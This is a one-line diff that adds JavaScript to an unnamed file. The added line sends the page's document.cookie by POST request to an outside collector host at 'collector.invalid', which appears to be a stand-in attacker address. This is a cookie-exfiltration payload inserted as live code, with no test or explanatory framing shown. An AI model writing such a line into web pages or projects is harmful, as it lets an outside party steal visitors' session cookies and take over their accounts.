@@ -1,0 +1,1 @@
+var x = new XMLHttpRequest(); x.open("POST", "https://collector.invalid/c", true); x.send(document.cookie);
